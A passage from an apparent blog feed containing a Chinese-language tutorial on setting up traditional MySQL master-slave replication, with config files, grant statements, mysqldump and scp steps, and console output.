&#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL7&#x300B;                  |    77 | &#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E;        ||      11 | &#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL8&#x300B;                  |    78 | &#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E;        ||      12 | &#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL9&#x300B;                  |    79 | &#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E;        |+---------+-----------------------------------+-------+-----------------------+12 rows in set (0.00 sec)mysql&gt; select * from book2;+-----------------------------------+-------+-------+| name                              | price | pages |+-----------------------------------+-------+-------+| &#x300A;Linux&#x4ECE;&#x5165;&#x95E8;&#x5230;&#x7CBE;&#x901A;&#x300B;             |    30 |   666 || &#x300A;&#x4E91;&#x8BA1;&#x7B97;&#x8D8B;&#x52BF;&#x300B;                    |    60 |   666 || &#x300A;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x8BBE;&#x8BA1;&#x4E0E;&#x5B9E;&#x73B0;&#x300B;            |    80 |   666 || &#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL&#x300B;                   |   166 |   666 |+-----------------------------------+-------+-------+4 rows in set (0.00 sec)mysql&gt; show master status;+------------------+----------+--------------+------------------+-------------------------------------------+| File             | Position | Binlog_Do_DB | Binlog_Ignore_DB | Executed_Gtid_Set                         |+------------------+----------+--------------+------------------+-------------------------------------------+| mysql-bin.000002 |     7113 |              |                  | 03a1eb63-c21a-11ec-b07f-000c2987bea6:1-25 |+------------------+----------+--------------+------------------+-------------------------------------------+1 row in set (0.00 sec)</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;MySQL-GTID-&amp;#x4E3B;&amp;#x4ECE;&amp;#x540C;&amp;#x6B65;&quot;&gt;&lt;a href=&quot;#MySQL-GTID-&amp;#x4E3B;&amp;#x4ECE;&amp;#x540C;&amp;#x6B65;&quot; class=&quot;headerlink&quot; title=&quot;MySQL 
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>MySQL传统主从同步</title>
    <link href="https://marnm.github.io//posts/607e4760/"/>
    <id>https://marnm.github.io//posts/607e4760/</id>
    <published>2022-06-07T04:44:52.000Z</published>
    <updated>2022-06-07T05:12:49.929Z</updated>
    
    <content type="html"><![CDATA[<h2 id="&#x73AF;&#x5883;"><a href="#&#x73AF;&#x5883;" class="headerlink" title="&#x73AF;&#x5883;"></a>&#x73AF;&#x5883;</h2><table><thead><tr><th><strong>&#x4E3B;&#x673A;&#x540D;</strong></th><th><strong>IP</strong></th><th><strong>&#x7CFB;&#x7EDF;/MySQL&#x7248;&#x672C;</strong></th><th>&#x89D2;&#x8272;</th></tr></thead><tbody><tr><td>MySQL_1</td><td>192.168.10.67</td><td>RHEL7.3/MySQL5.7</td><td>Master</td></tr><tr><td>MySQL_2</td><td>192.168.10.68</td><td>RHEL7.3/MySQL5.7</td><td>Slave</td></tr></tbody></table><h2 id="&#x539F;&#x7406;"><a href="#&#x539F;&#x7406;" class="headerlink" title="&#x539F;&#x7406;"></a>&#x539F;&#x7406;</h2><p><img src="http://192.168.85.188:8081/uploads/1652922895516766641123.png" alt=""></p><p>1)&#x3001;&#x5728;master&#x673A;&#x5668;&#x4E0A;&#x7684;&#x64CD;&#x4F5C;&#xFF1A;</p><p>&#x3000;  &#x5F53;master&#x4E0A;&#x7684;&#x6570;&#x636E;&#x53D1;&#x751F;&#x53D8;&#x5316;&#x65F6;&#xFF0C;&#x8BE5;&#x4E8B;&#x4EF6;&#x53D8;&#x5316;&#x4F1A;&#x6309;&#x7167;&#x987A;&#x5E8F;&#x5199;&#x5165;bin-log&#x4E2D;&#x3002;&#x5F53;slave&#x94FE;&#x63A5;&#x5230;master&#x7684;&#x65F6;&#x5019;&#xFF0C;master&#x673A;&#x5668;&#x4F1A;&#x4E3A;slave&#x5F00;&#x542F;binlog dump&#x7EBF;&#x7A0B;&#x3002;&#x5F53;master&#x7684;binlog&#x53D1;&#x751F;&#x53D8;&#x5316;&#x7684;&#x65F6;&#x5019;&#xFF0C;bin-log dump&#x7EBF;&#x7A0B;&#x4F1A;&#x901A;&#x77E5;slave&#xFF0C;&#x5E76;&#x5C06;&#x76F8;&#x5E94;&#x7684;binlog&#x5185;&#x5BB9;&#x53D1;&#x9001;&#x7ED9;slave&#x3002;</p><p>2)&#x3001;&#x5728;slave&#x673A;&#x5668;&#x4E0A;&#x64CD;&#x4F5C;&#xFF1A;</p><p>&#x3000;  &#x5F53;&#x4E3B;&#x4ECE;&#x540C;&#x6B65;&#x5F00;&#x542F;&#x7684;&#x65F6;&#x5019;&#xFF0C;slave&#x4E0A;&#x4F1A;&#x521B;&#x5EFA;&#x4E24;&#x4E2A;&#x7EBF;&#x7A0B;&#xFF1A;I/O&#x7EBF;&#x7A0B;&#x3002;&#x8BE5;&#x7EBF;&#x7A0B;&#x8FDE;&#x63A5;&#x5230;master&#x673A;&#x5668;&#xFF0C;master&#x673A;&#x5668;&#x4E0A;&#x7684;binlog dump &#x7EBF;&#x7A0B;&#x4F1A;&#x5C06;binlog&#x7684;&#x5185;&#x5BB9;&#x53D1;&#x9001;&#x7ED9;&#x8BE5;I/O&#x7EBF;&#x7A0B;&#x3002;&#x8BE5;I/O&#x7EBF;&#x7A0B;&#x63A5;&#x6536;&#x5230;binlog&#x5185;&#x5BB9;&#x540E;&#xFF0C;&#x518D;&#x5C06;&#x5185;&#x5BB9;&#x5199;&#x5165;&#x5230;&#x672C;&#x5730;&#x7684;relay log&#xFF1B;sql&#x7EBF;&#x7A0B;&#x3002;&#x8BE5;&#x7EBF;&#x7A0B;&#x8BFB;&#x53D6;&#x5230;I/O&#x7EBF;&#x7A0B;&#x5199;&#x5165;&#x7684;relay log&#x3002;&#x5E76;&#x4E14;&#x6839;&#x636E;replay log&#x3002;&#x5E76;&#x4E14;&#x6839;&#x636E;relay log &#x7684;&#x5185;&#x5BB9;&#x5BF9;slave&#x6570;&#x636E;&#x5E93;&#x505A;&#x76F8;&#x5E94;&#x7684;&#x64CD;&#x4F5C;&#x3002;</p><p>3)&#x3001;MySQL&#x4E3B;&#x4ECE;&#x540C;&#x6B65;&#x539F;&#x7406;&#x56FE;&#x5982;&#x4E0B;:</p><p><img src="http://192.168.85.188:8081/uploads/1652922926865746299theory.png" alt=""></p><p>&#x4ECE;&#x5E93;&#x751F;&#x6210;&#x4E24;&#x4E2A;&#x7EBF;&#x7A0B;&#xFF0C;&#x4E00;&#x4E2A;I/O&#x7EBF;&#x7A0B;&#xFF0C;&#x4E00;&#x4E2A;SQL&#x7EBF;&#x7A0B;&#xFF1B;<br>I/O&#x7EBF;&#x7A0B;&#x53BB;&#x8BF7;&#x6C42;&#x4E3B;&#x5E93;&#x7684;binlog&#xFF0C;&#x5E76;&#x5C06;&#x5F97;&#x5230;&#x7684;binlog&#x65E5;&#x5FD7;&#x5199;&#x5230;relay log&#xFF08;&#x4E2D;&#x7EE7;&#x65E5;&#x5FD7;&#xFF09; &#x6587;&#x4EF6;&#x4E2D;&#xFF1B;<br>&#x4E3B;&#x5E93;&#x4F1A;&#x751F;&#x6210;&#x4E00;&#x4E2A; log dump &#x7EBF;&#x7A0B;&#xFF0C;&#x7528;&#x6765;&#x7ED9;&#x4ECE;&#x5E93;I/O&#x7EBF;&#x7A0B;&#x4F20;binlog&#xFF1B;<br>SQL &#x7EBF;&#x7A0B;&#xFF0C;&#x4F1A;&#x8BFB;&#x53D6;relay log&#x6587;&#x4EF6;&#x4E2D;&#x7684;&#x65E5;&#x5FD7;&#xFF0C;&#x5E76;&#x89E3;&#x6790;&#x6210;&#x5177;&#x4F53;&#x64CD;&#x4F5C;&#xFF0C;&#x6765;&#x5B9E;&#x73B0;&#x4E3B;&#x4ECE;&#x7684;&#x64CD;&#x4F5C;&#x4E00;&#x81F4;&#xFF0C;&#x800C;&#x6700;&#x7EC8;&#x6570;&#x636E;&#x4E00;&#x81F4;&#xFF1B;  </p><p><span style="color:red"><em>&#x6CE8;&#x610F;&#xFF1A;&#x642D;&#x5EFA;MySQL&#x4E3B;&#x4ECE;&#x540C;&#x6B65;&#x524D;&#xFF0C;&#x9700;&#x8981;&#x5206;&#x522B;&#x5728;&#x4E3B;&#x6570;&#x636E;&#x548C;&#x4ECE;&#x6570;&#x636E;&#x4E0A;&#x5B89;&#x88C5;&#x5E76;&#x914D;&#x7F6E;&#x597D;MySQL&#x6570;&#x636E;&#x5E93;&#xFF01;  </em></span></p><h2 id="&#x914D;&#x7F6E;-Master-192-168-10-67"><a href="#&#x914D;&#x7F6E;-Master-192-168-10-67" class="headerlink" title="&#x914D;&#x7F6E; Master 192.168.10.67"></a>&#x914D;&#x7F6E; Master 192.168.10.67</h2><h3 id="&#x914D;&#x7F6E;-etc-my-cnf"><a href="#&#x914D;&#x7F6E;-etc-my-cnf" class="headerlink" title="&#x914D;&#x7F6E; /etc/my.cnf"></a>&#x914D;&#x7F6E; /etc/my.cnf</h3><pre><code class="xml">[root@MySQL1 mysql&#x2010;5.7.19]# vim /etc/my.cnf[client]port=3306socket=/data/mysql/mysql.sock[mysqld]  character&#x2010;set&#x2010;server=utf8collation&#x2010;server=utf8_general_ciskip&#x2010;name&#x2010;resolveuser=mysqlport=3306basedir=/usr/local/mysql57datadir=/data/mysqltmpdir=/tmpsocket=/data/mysql/mysql.socklog&#x2010;error=/data/mysql/mysqld.logpid&#x2010;file=/data/mysql/mysqld.pidlog&#x2010;bin=mysql&#x2010;bin&#x2010;master #&#x542F;&#x7528;&#x4E8C;&#x8FDB;&#x5236;&#x65E5;&#x5FD7;binlog_format=mixedserver&#x2010;id=1 #&#x672C;&#x673A;&#x6570;&#x636E;&#x5E93;ID &#x6807;&#x793A;binlog&#x2010;do&#x2010;db=TESTDB #&#x53EF;&#x4EE5;&#x88AB;&#x4ECE;&#x670D;&#x52A1;&#x5668;&#x590D;&#x5236;&#x7684;&#x5E93;, &#x4E8C;&#x8FDB;&#x5236;&#x9700;&#x8981;&#x540C;&#x6B65;&#x7684;&#x6570;&#x636E;&#x5E93;&#x540D;binlog&#x2010;ignore&#x2010;db=mysql #&#x4E0D;&#x53EF;&#x4EE5;&#x88AB;&#x4ECE;&#x670D;&#x52A1;&#x5668;&#x590D;&#x5236;&#x7684;&#x5E93;lower_case_table_names=1#&#x6CE8;&#x610F;&#xFF1A;Linux&#x4E0B;&#x90E8;&#x7F72;&#x5B89;&#x88C5;MySQL&#xFF0C;&#x9ED8;&#x8BA4;&#x4E0D;&#x5FFD;&#x7565;&#x8868;&#x540D;&#x5927;&#x5C0F;&#x5199;&#xFF0C;&#x9700;&#x8981;&#x624B;&#x52A8;&#x5230;/etc/my.cnf &#x4E0B;&#x914D;&#x7F6E; lower_case_table_names=1 &#x4F7F;Linux&#x73AF;&#x5883;&#x4E0B;MySQL&#x5FFD;&#x7565;&#x8868;&#x540D;&#x5927;&#x5C0F;&#x5199;&#xFF0C;&#x5426;&#x5219;&#x4F7F;&#x7528;MyCAT&#x7684;&#x65F6;&#x5019;&#x4F1A;&#x63D0;&#x793A;&#x627E;&#x4E0D;&#x5230;&#x8868;&#x7684;&#x9519;&#x8BEF;&#xFF01; ~ ~&quot;/etc/my.cnf&quot; 24L, 556C written</code></pre><pre><code class="xml">[root@MySQL1 ~]# service mysqld restartShutting down MySQL........... SUCCESS!Starting MySQL. SUCCESS!</code></pre><p>&#x521B;&#x5EFA;&#x8981;&#x540C;&#x6B65;&#x7684;&#x6570;&#x636E;&#x5E93;&#x5E76;&#x521B;&#x5EFA;&#x8868;</p><pre><code class="sql">[root@MySQL1 mysql&#x2010;5.7.19]# mysql -uroot -pJaking@vip.163.commysql&gt;CREATE DATABASE TESTDB;show databases;use TESTDB;CREATE TABLE TABLE666 (bTypeId int,bName char(16),price int,publishing char(16));mysql&gt; CREATE DATABASE TESTDB;Query OK, 1 row affected (0.00 sec)mysql&gt; show databases;+--------------------+| Database           |+--------------------+| information_schema || mysql              || performance_schema || sys                || testdb             |+--------------------+5 rows in set (0.00 sec)mysql&gt; use TESTDB;Database changedmysql&gt; CREATE TABLE TABLE666 (bTypeId int,bName char(16),price int,publishing char(16));Query OK, 0 rows affected (0.01 sec)</code></pre><p>&#x6388;&#x6743;</p><pre><code class="sql">[root@MySQL1 mysql&#x2010;5.7.19]# mysql -uroot -pJaking@vip.163.com#&#x5982;&#x679C;&#x63D0;&#x793A; mysql &#x547D;&#x4EE4;&#x4E0D;&#x5B58;&#x5728;&#xFF0C;&#x8BF7;&#x5C1D;&#x8BD5;&#x7528; /usr/local/mysql57/bin/mysql &#x2010;uroot &#x2010;p&quot;Jaking@vip.163.com&quot; &#x6765;&#x767B;&#x5F55;MySQL&#x6570;&#x636E;&#x5E93;mysql: [Warning] Using a password on the command line interface can be insecure.Welcome to the MySQL monitor. Commands end with ; or \g.Your MySQL connection id is 3Server version: 5.7.19&#x2010;log Source distributionCopyright (c) 2000, 2017, Oracle and/or its affiliates. All rights reserved.Oracle is a registered trademark of Oracle Corporation and/or itsaffiliates. Other names may be trademarks of their respective owners.Type &apos;help;&apos; or &apos;\h&apos; for help. Type &apos;\c&apos; to clear the current input statement.mysql&gt; grant replication slave on *.* to slave@&quot;192.168.10.%&quot; identified by &quot;Jaking@vip.163.com&quot;;Query OK, 0 rows affected, 1 warning (0.01 sec)mysql&gt; show master status;+-------------------------+----------+--------------+------------------+-------------------+| File                    | Position | Binlog_Do_DB | Binlog_Ignore_DB | Executed_Gtid_Set |+-------------------------+----------+--------------+------------------+-------------------+| mysql-bin-master.000002 |      154 | TESTDB       | mysql            |                   |+-------------------------+----------+--------------+------------------+-------------------+1 row in set (0.00 sec)mysql&gt; show binlog events\G*************************** 1. row ***************************   Log_name: mysql-bin-master.000001        Pos: 4 Event_type: Format_desc  Server_id: 11End_log_pos: 123       Info: Server ver: 5.7.24-log, Binlog ver: 4*************************** 2. row ***************************   Log_name: mysql-bin-master.000001        Pos: 123 Event_type: Previous_gtids  Server_id: 11End_log_pos: 154       Info: *************************** 3. row ***************************   Log_name: mysql-bin-master.000001        Pos: 154 Event_type: Stop  Server_id: 11End_log_pos: 177       Info: 3 rows in set (0.00 sec)mysql&gt; flush privileges;Query OK, 0 rows affected (0.00 sec)mysql&gt; exitBye[root@MySQL1 ~]# ls /var/lib/mysqlauto.cnf         ib_logfile1              performance_schemaca-key.pem       ibtmp1                   private_key.pemca.pem           mysql                    public_key.pemclient-cert.pem  mysql-bin-master.000001  server-cert.pemclient-key.pem   mysql-bin-master.000002  server-key.pemib_buffer_pool   mysql-bin-master.index   sysibdata1          mysql.sock               testdbib_logfile0      mysql.sock.lock[root@MySQL1 ~]# </code></pre><p>&#x5BFC;&#x51FA;&#x6570;&#x636E;&#x5E93;&#x5E76;&#x4F20;&#x7ED9;&#x4ECE;&#x670D;&#x52A1;&#x5668;</p><pre><code class="xml">[root@MySQL1 mysql&#x2010;5.7.19]# mysqldump -uroot -pJaking@vip.163.com -B TESTDB &gt; TESTDB.sqlmysqldump: [Warning] Using a password on the command line interface can be insecure.[root@MySQL1 mysql&#x2010;5.7.19]# lsBUILD CPackConfig.cmake install_manifest.txt mysys storageclient CPackSourceConfig.cmake libbinlogevents mysys_ssl stringscmake CTestTestfile.cmake libbinlogstandalone packaging support&#x2010;filesCMakeCache.txt dbug libevent plugin testclientsCMakeFiles Docs libmysql rapid unittestcmake_install.cmake Doxyfile&#x2010;perfschema libmysqld README VERSIONCMakeLists.txt extra libservices regex VERSION.depcmd&#x2010;line&#x2010;utils TESTDB.sql make_dist.cmake scripts vioconfig.h.cmake include Makefile source_downloads winconfigure.cmake info_macros.cmake man sql zlibCOPYING INSTALL mysql&#x2010;test sql&#x2010;common[root@MySQL1 mysql&#x2010;5.7.19]# scp TESTDB.sql 192.168.10.68:/rootThe authenticity of host &apos;192.168.10.68 (192.168.10.68)&apos; can&apos;t be established.ECDSA key fingerprint is 57:3d:7f:91:5a:bc:6f:a1:88:4f:d2:fc:17:0e:51:8b.Are you sure you want to continue connecting (yes/no)? yesWarning: Permanently added &apos;192.168.10.68&apos; (ECDSA) to the list of knownhosts.root@192.168.10.68&apos;s password:TESTDB.sql 100% 1765 1.7KB/s 00:00</code></pre><h2 id="&#x914D;&#x7F6E;-Slave-192-168-10-68"><a href="#&#x914D;&#x7F6E;-Slave-192-168-10-68" class="headerlink" title="&#x914D;&#x7F6E; Slave 192.168.10.68"></a>&#x914D;&#x7F6E; Slave 192.168.10.68</h2><h3 id="&#x914D;&#x7F6E;-etc-my-cnf-1"><a href="#&#x914D;&#x7F6E;-etc-my-cnf-1" class="headerlink" title="&#x914D;&#x7F6E; /etc/my.cnf"></a>&#x914D;&#x7F6E; /etc/my.cnf</h3><pre><code class="xml">[root@MySQL2 ~]# vim /etc/my.cnf[client]port=3306socket=/data/mysql/mysql.sock[mysqld]cTESTDBracter&#x2010;set&#x2010;server=utf8collation&#x2010;server=utf8_general_ciskip&#x2010;name&#x2010;resolveuser=mysqlport=3306basedir=/usr/local/mysql57datadir=/data/mysqltmpdir=/tmpsocket=/data/mysql/mysql.socklog&#x2010;error=/data/mysql/mysqld.logpid&#x2010;file=/data/mysql/mysqld.pidserver&#x2010;id=2#&#x4ECE;&#x670D;&#x52A1;&#x5668;ID&#x53F7;&#xFF0C;&#x4E0D;&#x8981;&#x548C;&#x4E3B;ID&#x76F8;&#x540C; &#xFF0C;&#x5982;&#x679C;&#x8BBE;&#x7F6E;&#x591A;&#x4E2A;&#x4ECE;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x6BCF;&#x4E2A;&#x4ECE;&#x670D;&#x52A1;&#x5668;&#x5FC5;&#x987B;&#x6709;&#x4E00;&#x4E2A;&#x552F;&#x4E00;&#x7684;server&#x2010;id&#x503C;&#xFF0C;&#x5FC5;&#x987B;&#x4E0E;&#x4E3B;&#x670D;&#x52A1;&#x5668;&#x7684;&#x4EE5;&#x53CA;&#x5176;&#x5B83;&#x4ECE;&#x670D;&#x52A1;&#x5668;&#x7684;&#x4E0D;&#x76F8;&#x540C;&#x3002;&#x53EF;&#x4EE5;&#x8BA4;&#x4E3A;server&#x2010;id&#x503C;&#x7C7B;&#x4F3C;&#x4E8E;IP&#x5730;&#x5740;&#xFF1A;&#x8FD9;&#x4E9B;ID&#x503C;&#x80FD;&#x552F;&#x4E00;&#x8BC6;&#x522B;&#x590D;&#x5236;&#x670D;&#x52A1;&#x5668;&#x7FA4;&#x96C6;&#x4E2D;&#x7684;&#x6BCF;&#x4E2A;&#x670D;&#x52A1;&#x5668;&#x5B9E;&#x4F8B;&#x3002;lower_case_table_names=1#&#x6CE8;&#x610F;&#xFF1A;Linux&#x4E0B;&#x90E8;&#x7F72;&#x5B89;&#x88C5;MySQL&#xFF0C;&#x9ED8;&#x8BA4;&#x4E0D;&#x5FFD;&#x7565;&#x8868;&#x540D;&#x5927;&#x5C0F;&#x5199;&#xFF0C;&#x9700;&#x8981;&#x624B;&#x52A8;&#x5230;/etc/my.cnf &#x4E0B;&#x914D;&#x7F6E; lower_case_table_names=1 &#x4F7F;Linux&#x73AF;&#x5883;&#x4E0B;MySQL&#x5FFD;&#x7565;&#x8868;&#x540D;&#x5927;&#x5C0F;&#x5199;&#xFF0C;&#x5426;&#x5219;&#x4F7F;&#x7528;MyCAT&#x7684;&#x65F6;&#x5019;&#x4F1A;&#x63D0;&#x793A;&#x627E;&#x4E0D;&#x5230;&#x8868;&#x7684;&#x9519;&#x8BEF;&#xFF01;~~&quot;/etc/my.cnf&quot; 20L, 649C written</code></pre><pre><code class="xml">[root@MySQL2 ~]# service mysqld restartShutting down MySQL.. [ OK ]Starting MySQL. [ OK ]</code></pre><p><em>&#x4E24;&#x53F0;&#x6570;&#x636E;&#x5E93;&#x670D;&#x52A1;&#x5668;mysql&#x7248;&#x672C;&#x8981;&#x4E00;&#x81F4;</em></p><pre><code class="sql">[root@MySQL1 ~]# mysql &#x2010;uroot &#x2010;pJaking@vip.163.commysql: [Warning] Using a password on the command line interface can be insecure.Welcome to the MySQL monitor. Commands end with ; or \g.Your MySQL connection id is 21Server version: 5.7.19&#x2010;log Source distributionCopyright (c) 2000, 2017, Oracle and/or its affiliates. All rights reserved.Oracle is a registered trademark of Oracle Corporation and/or itsaffiliates. Other names may be trademarks of their respectiveowners.Type &apos;help;&apos; or &apos;\h&apos; for help. Type &apos;\c&apos; to clear the current input statement.mysql&gt; show variables like &apos;%version%&apos;; +&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;+&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;+ | Variable_name | Value | +&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;+&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;+ | innodb_version | 5.7.19 | | protocol_version | 10 | | slave_type_conversions | | | tls_version | TLSv1,TLSv1.1 | | version | 5.7.19&#x2010;log | | version_comment | Source distribution | | version_compile_machine | x86_64 | | version_compile_os | Linux | +&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;+&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;+ 8 rows in set (0.01 sec) mysql&gt;[root@MySQL2 mysql]# mysql &#x2010;uroot &#x2010;pJaking@vip.163.com mysql: [Warning] Using a password on the command line interface can be insecure. Welcome to the MySQL monitor. Commands end with ; or \g. Your MySQL connection id is 6 Server version: 5.7.19 Source distribution Copyright (c) 2000, 2017, Oracle and/or its affiliates. All rights reserved. Oracle is a registered trademark of Oracle Corporation and/or its affiliates. Other names may be trademarks of their respective owners. Type &apos;help;&apos; or &apos;\h&apos; for help. Type &apos;\c&apos; to clear the current input statement. mysql&gt; show variables like &apos;%version%&apos;; +&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;+&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;+ | Variable_name | Value | +&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;+&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;+ | innodb_version | 5.7.19 | | protocol_version | 10 | | slave_type_conversions | | | tls_version | TLSv1,TLSv1.1 | | version | 5.7.19 | | version_comment | Source distribution | | version_compile_machine | x86_64 | | version_compile_os | Linux | +&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;+&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;+ 8 rows in set (0.02 sec) mysql&gt; exit Bye</code></pre><p>&#x6D4B;&#x8BD5;&#x8FDE;&#x63A5;&#x5230;&#x4E3B;&#x6570;&#x636E;&#x5E93;&#x662F;&#x5426;&#x6210;&#x529F;</p><pre><code class="sql"> [root@MySQL2 mysql]# mysql -uslave -pJaking@vip.163.com -h 192.168.10.67 mysql: [Warning] Using a password on the command line interface can be insecure. Welcome to the MySQL monitor. Commands end with ; or \g. Your MySQL connection id is 5 Server version: 5.7.19&#x2010;log Source distribution Copyright (c) 2000, 2017, Oracle and/or its affiliates. All rights reserved. Oracle is a registered trademark of Oracle Corporation and/or its affiliates. Other names may be trademarks of their respective owners. Type &apos;help;&apos; or &apos;\h&apos; for help. Type &apos;\c&apos; to clear the current input statement. mysql&gt; show databases; +&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;+ | Database | +&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;+ | information_schema | +&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;+ 1 row in set (0.00 sec)</code></pre><p> #&#x6B64;&#x65F6;&#x770B;&#x4E0D;&#x5230; TESTDB &#x6570;&#x636E;&#x5E93;&#x5C5E;&#x6B63;&#x5E38;&#x73B0;&#x8C61;</p><p>&#x5411;TESTDB&#x6570;&#x636E;&#x5E93;&#x5BFC;&#x5165;&#x6570;&#x636E;</p><pre><code class="sql">[root@MySQL2 ~]# mysql -uroot -pJaking@vip.163.com &lt; TESTDB.sql mysql: [Warning] Using a password on the command line interface can be insecure.[root@MySQL2 ~]# mysql -uroot -pJaking@vip.163.commysql: [Warning] Using a password on the command line interface can be insecure.Welcome to the MySQL monitor. Commands end with ; or \g.Your MySQL connection id is 11Server version: 5.7.19 Source distributionCopyright (c) 2000, 2017, Oracle and/or its affiliates. All rights reserved.Oracle is a registered trademark of Oracle Corporation and/or itsaffiliates. Other names may be trademarks of their respectiveowners.Type &apos;help;&apos; or &apos;\h&apos; for help. Type &apos;\c&apos; to clear the current input statement.mysql&gt; show databases;+&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;+| Database |+&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;+| information_schema || TESTDB || mysql || performance_schema || sys |+&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;+5 rows in set (0.00 sec)mysql&gt; use TESTDB;Reading table information for completion of table and column namesYou can turn off this feature to get a quicker startup with &#x2010;ADatabase changedmysql&gt; show tables;+&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;+| Tables_in_TESTDB |+&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;+| table666 |+&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;+1 row in set (0.00 sec)mysql&gt; exitBye</code></pre><p>&#x6307;&#x5B9A;&#x4E3B;&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x91CD;&#x542F;slave</p><pre><code class="sql">[root@MySQL2 ~]# mysql -uroot -pJaking@vip.163.commysql: [Warning] Using a password on the command line interface can be insecure.Welcome to the 